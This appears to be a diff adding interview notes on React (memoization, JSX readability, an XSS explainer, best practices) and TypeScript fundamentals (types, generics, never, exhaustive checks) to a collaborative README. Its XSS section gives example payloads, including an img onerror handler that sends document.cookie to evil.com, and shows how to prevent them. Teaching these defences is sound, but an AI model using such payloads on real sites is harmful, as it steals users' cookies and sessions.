+    const childStyle = useMemo(() => ({ color: "red" }), []);
+
+    <Child onClick={handleChildClick} />
+    <Child style={childStyle} />
+    ```
+
+    - **Exception:** If the child is NOT wrapped in `React.memo`, inline functions are fine — the extra object allocation is negligible.
+    - **Keep JSX readable:** If JSX grows large, extract sections into named sub-components rather than adding layers of logic inline.
+
+    ```jsx
+    // ❌ Deeply nested conditional logic in JSX
+    return (
+      <div>
+        {isLoading ? <Spinner /> : error ? <ErrorMsg msg={error} /> : data.map(d => <Item key={d.id} {...d} />)}
+      </div>
+    );
+
+    // ✅ Extracted — easy to read
+    const Content = () => {
+      if (isLoading) return <Spinner />;
+      if (error) return <ErrorMsg msg={error} />;
+      return data.map(d => <Item key={d.id} {...d} />);
+    };
+    return <div><Content /></div>;
+    ```
+
+52. XSS (Cross-Site Scripting) in React — what it is and how to prevent it
+    - **XSS** is an attack where a hacker injects malicious JavaScript into your app. When other users load the page, the script runs in their browser — stealing cookies, tokens, or performing actions on their behalf.
+
+    **How a hacker injects values:**
+    - Via URL params: `https://app.com?name=<script>stealCookies()</script>`
+    - Via form inputs or API responses that contain HTML/JS strings
+    - If you render these directly as HTML, the browser executes the script
+
+    ```jsx
+    // ❌ Dangerous — renders user input as raw HTML
+    const Comment = ({ content }) => (
+      <div dangerouslySetInnerHTML={{ __html: content }} />
+    );
+    // If content = '<img src=x onerror="fetch(`evil.com?c=${document.cookie}`)">'
+    // → browser executes the onerror handler → cookies stolen
+
+    // ✅ Safe — React escapes by default
+    const Comment = ({ content }) => <div>{content}</div>;
+    // '<script>...' is rendered as plain text — browser never executes it
+
+    // ✅ If you MUST render HTML — sanitize first
+    import DOMPurify from "dompurify";
+    const SafeComment = ({ html }) => (
+      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+    );
+    ```
+
+    - React's `{}` JSX expressions **automatically escape** HTML — `<`, `>`, `&`, `"` become safe text entities.
+    - Only `dangerouslySetInnerHTML` bypasses this — treat it like `eval()` and always sanitize the input.
+
+53. React Do's and Don'ts
+
+    | ✅ Do | ❌ Don't |
+    | --- | --- |
+    | Keep components small and focused (SRP) | Write one component that does everything |
+    | Use `useState` for local UI state | Mutate state directly (`state.x = 1`) |
+    | Spread to update objects/arrays (`{...obj}`) | Push/splice/mutate existing arrays or objects |
+    | Declare all `useEffect` dependencies | Leave out deps to "avoid re-runs" (stale closure bugs) |
+    | Return cleanup from `useEffect` for listeners/timers | Leave event listeners attached after unmount (memory leaks) |
+    | Use `key` with unique IDs in lists | Use array index as `key` for dynamic/reordered lists |
+    | Extract repeated logic into custom hooks | Duplicate `useEffect` + `useState` logic across components |
+    | Use `React.memo` + `useCallback` when profiling shows re-render issues | Wrap everything in `memo`/`useCallback` prematurely |
+    | Use `React.lazy` + `Suspense` to split large routes | Import everything at the top — bloats initial bundle |
+    | Sanitize HTML before `dangerouslySetInnerHTML` | Trust user input or API strings as safe HTML |
+    | Use `useCallback` for handlers passed to memoized children | Create inline arrow functions inside JSX for performance-sensitive components |
+    | Use `ErrorBoundary` around route-level components | Let one broken component crash the whole app |
+    | Use `Context` or state management for shared data | Prop-drill more than 2–3 levels deep |
+
+---
+
 ## 🟣 Node.js
 
 1. What is the Node.js Runtime?
@@ -748,3 +2651,303 @@ This repo is collaborative — feel free to contribute more questions 🚀
      - **Eval:** Takes the data structure and evaluates the code.
      - **Print:** Prints the result of the evaluation to the console.
      - **Loop:** Loops the entire process until the user terminates the session.
+
+---
+
+## 🔷 TypeScript
+
+1. What is TypeScript and why use it?
+   - TypeScript is a **statically typed superset of JavaScript** developed by Microsoft. It adds optional types, interfaces, generics, and other features to JS, then compiles down to plain JavaScript.
+   - All valid JavaScript is valid TypeScript — you opt into strictness gradually.
+
+   | Feature | JavaScript | TypeScript |
+   | --- | --- | --- |
+   | Type checking | At runtime | At compile time |
+   | Errors caught | When code runs | Before code ships |
+   | IDE support | Basic | Rich autocomplete, refactoring |
+   | Readability | Implicit types | Self-documenting types |
+
+   ```ts
+   // JavaScript — error only at runtime
+   function add(a, b) { return a + b; }
+   add("5", 3); // "53" — silent bug
+
+   // TypeScript — error caught at compile time
+   function add(a: number, b: number): number { return a + b; }
+   add("5", 3); // ❌ Error: Argument of type 'string' is not assignable to parameter of type 'number'
+   ```
+
+2. What is type inference in TypeScript?
+   - TypeScript can **automatically determine the type** of a variable from its initial value — you don't always need to annotate explicitly.
+
+   ```ts
+   let name = "Mohamed";   // inferred as string
+   let age  = 25;           // inferred as number
+   let flag = true;         // inferred as boolean
+
+   name = 42;  // ❌ Error: Type 'number' is not assignable to type 'string'
+
+   // Inference in functions
+   const add = (a: number, b: number) => a + b;
+   // return type inferred as number — no annotation needed
+
+   // When to annotate explicitly:
+   let result: string | null = null; // needed — can't infer union from null alone
+   ```
+
+3. What are the data types in TypeScript?
+
+   **Primitive types:**
+
+   | Type | Description | Example |
+   | --- | --- | --- |
+   | `string` | Text values | `"hello"` |
+   | `number` | All numbers (int + float) | `42`, `3.14` |
+   | `boolean` | True/false | `true`, `false` |
+   | `null` | Intentional absence of value | `null` |
+   | `undefined` | Variable declared but not assigned | `undefined` |
+   | `symbol` | Unique identifier | `Symbol("id")` |
+   | `bigint` | Large integers | `9007199254740991n` |
+
+   **Special types:**
+
+   | Type | Description |
+   | --- | --- |
+   | `any` | Disables type checking — escape hatch |
+   | `unknown` | Type-safe `any` — must narrow before use |
+   | `never` | Value that can never occur |
+   | `void` | Function returns nothing |
+
+   **Object types:**
+
+   ```ts
+   // Array
+   const nums: number[] = [1, 2, 3];
+   const strs: Array<string> = ["a", "b"];
+
+   // Tuple — fixed length, fixed types
+   const pair: [string, number] = ["age", 25];
+
+   // Enum
+   enum Direction { Up, Down, Left, Right }
+   const dir: Direction = Direction.Up; // 0
+
+   // Object
+   const user: { name: string; age: number } = { name: "Mohamed", age: 25 };
+   ```
+
+4. What is the difference between `any`, `unknown`, and `never`?
+
+   | | `any` | `unknown` | `never` |
+   | --- | --- | --- | --- |
+   | Type checking | ❌ Disabled entirely | ✅ Must narrow before use | N/A — value never exists |
+   | Assignable to anything | ✅ Yes | ❌ No | ✅ Yes (it's the bottom type) |
+   | Anything assignable to it | ✅ Yes | ✅ Yes | ❌ No |
+   | Use case | Migrating JS → TS, quick escape hatch | Safer APIs, user input | Impossible branches, functions that never return |
+
+   ```ts
+   // any — no safety
+   let a: any = "hello";
+   a.toFixed();  // no TS error, crashes at runtime
+
+   // unknown — must narrow first
+   let u: unknown = "hello";
+   u.toUpperCase();  // ❌ Error
+   if (typeof u === "string") {
+     u.toUpperCase();  // ✅ OK — type narrowed to string
+   }
+
+   // never — function that never returns normally
+   function fail(msg: string): never {
+     throw new Error(msg);  // always throws — control never leaves this function
+   }
+
+   function infinite(): never {
+     while (true) {}  // never returns
+   }
+   ```
+
+5. What is the difference between `type` and `interface`?
+
+   | Feature | `type` | `interface` |
+   | --- | --- | --- |
+   | Object shapes | ✅ Yes | ✅ Yes |
+   | Primitives / unions | ✅ Yes (`type ID = string \| number`) | ❌ No |
+   | Extend / inherit | `&` (intersection) | `extends` keyword |
+   | Declaration merging | ❌ No — re-declaring is an error | ✅ Yes — same name merges |
+   | Computed properties | ✅ Yes | ❌ No |
+
+   ```ts
+   // interface — best for object shapes and public APIs
+   interface User {
+     name: string;
+     age: number;
+   }
+   interface User {
+     email: string; // ✅ Merges with the first — final User has all 3 fields
+   }
+
+   // type — best for unions, intersections, primitives
+   type ID = string | number;
+   type Point = { x: number } & { y: number }; // intersection = both shapes
+   type Status = "active" | "inactive" | "banned";
+
+   // Both support extending
+   interface Admin extends User { role: string; }
+   type Admin = User & { role: string };
+   ```
+
+   - **Rule of thumb:** Use `interface` for class/object shapes. Use `type` for everything else (unions, tuples, mapped types).
+
+6. What are generics in TypeScript?
+   - Generics let you write **reusable code that works with different types** while keeping full type safety. Think of `<T>` as a type placeholder that gets filled in when the function/class is used.
+
+   ```ts
+   // Without generics — must pick one type or use any (loses safety)
+   function identity(value: any): any { return value; }
+
+   // With generics — type-safe AND reusable
+   function identity<T>(value: T): T { return value; }
+
+   identity<string>("hello");  // T = string
+   identity<number>(42);        // T = number
+   identity("world");           // T inferred as string
+   ```
+
+   ```ts
+   // Generic with constraint — T must have a length property
+   function getLength<T extends { length: number }>(arg: T): number {
+     return arg.length;
+   }
+   getLength("hello");    // 5
+   getLength([1, 2, 3]);  // 3
+   getLength(42);         // ❌ Error: number has no length
+
+   // Generic interface — reusable API response shape
+   interface ApiResponse<T> {
+     data: T;
+     status: number;
+     message: string;
+   }
+   const usersRes: ApiResponse<User[]> = { data: [], status: 200, message: "OK" };
+   const postRes: ApiResponse<Post>   = { data: post, status: 200, message: "OK" };
+
+   // Generic with multiple types
+   function pair<K, V>(key: K, value: V): [K, V] {
+     return [key, value];
+   }
+   const p = pair("name", "Mohamed"); // [string, string]
+   ```
+
+7. What are optional properties, optional chaining, and nullish coalescing?
+   - **Optional property (`?`)** — marks an object field as `type | undefined`.
+   - **Optional chaining (`?.`)** — safely accesses nested properties; returns `undefined` instead of throwing if the chain is `null`/`undefined`.
+   - **Non-null assertion (`!`)** — tells TypeScript "I guarantee this is not null/undefined" (use sparingly).
+   - **Nullish coalescing (`??`)** — returns the right side only when the left is `null` or `undefined` (not for `0` or `""`).
+
+   ```ts
+   interface User {
+     name: string;
+     age?: number;          // optional — string | undefined
+     address?: {
+       city?: string;
+     };
+   }
+
+   const user: User = { name: "Mohamed" };
+
+   // Optional chaining — no crash if address or city is undefined
+   console.log(user.address?.city);        // undefined (no throw)
+   console.log(user.address?.city?.toUpperCase()); // undefined
+
+   // Non-null assertion — use only when you're certain
+   const input = document.getElementById("name") as HTMLInputElement;
+   console.log(input!.value);              // tells TS: trust me, not null
+
+   // Nullish coalescing
+   const age = user.age ?? 18;             // 18 only if age is null/undefined
+   const label = user.name ?? "Anonymous"; // "Mohamed" — name exists
+
+   // vs || (OR) — also triggers on 0 and ""
+   const count = 0;
+   console.log(count || 10);  // 10 — wrong! 0 is falsy
+   console.log(count ?? 10);  // 0  — correct! 0 is not null/undefined
+   ```
+
+8. What is the `never` type and when is it used?
+   - `never` represents a **value that can never occur**. It is the **bottom type** — assignable to every type, but nothing is assignable to `never`.
+
+   **Case 1 — Function that always throws:**
+   ```ts
+   function throwError(msg: string): never {
+     throw new Error(msg); // always throws, never returns normally
+   }
+   ```
+
+   **Case 2 — Function that never terminates:**
+   ```ts
+   function runForever(): never {
+     while (true) { /* infinite loop */ }
+   }
+   ```
+
+   **Case 3 — After narrowing, no type remains:**
+   ```ts
+   function process(value: string | number) {
+     if (typeof value === "string") {
+       value; // string
+     } else if (typeof value === "number") {
+       value; // number
+     } else {
+       value; // never — all cases handled, nothing is left
+     }
+   }
+   ```
+
+   ```ts
+   // ⚠️ Note — a void function is NOT never
+   const fn = (): void => {
+     console.log(5); // returns undefined — control does leave the function
+   };
+   // never means control NEVER leaves normally (always throws or loops forever)
+   ```
+
+9. What is the exhaustive check pattern with `never`?
+   - Assign the leftover value to `never` in a `switch` default case. If you add a new variant to the union but forget to handle it, TypeScript gives a **compile-time error** — catching the bug before runtime.
+
+   ```ts
+   type Shape = "circle" | "square" | "triangle";
+
+   function getArea(shape: Shape): number {
+     switch (shape) {
+       case "circle":   return 1;
+       case "square":   return 2;
+       case "triangle": return 3;
+       default:
+         const _exhaustive: never = shape;
+         // ❌ Compile error if any case above is missing
+         return _exhaustive;
+     }
+   }
+   ```
+
+   - Yes — **the `default` branch can never be reached at runtime** when all cases are handled. That's exactly the point: TypeScript ensures at compile time that every variant of `Shape` has a `case`, so nothing ever falls through to `default`.
+   - If you add `"rectangle"` to `Shape` without adding `case "rectangle":`, TypeScript immediately errors on `const _exhaustive: never = shape` because `shape` would be `"rectangle"` there — which is not assignable to `never`.
+
+   ```ts
+   // Adding a new shape — TS forces you to handle it
+   type Shape = "circle" | "square" | "triangle" | "rectangle"; // added
+
+   function getArea(shape: Shape): number {
+     switch (shape) {
+       case "circle":   return 1;
+       case "square":   return 2;
+       case "triangle": return 3;
+       // ❌ TS Error: Type '"rectangle"' is not assignable to type 'never'
+       // → you MUST add case "rectangle": before this compiles
+       default:
+         const _exhaustive: never = shape;
+         return _exhaustive;
+     }
+   }
+   ```
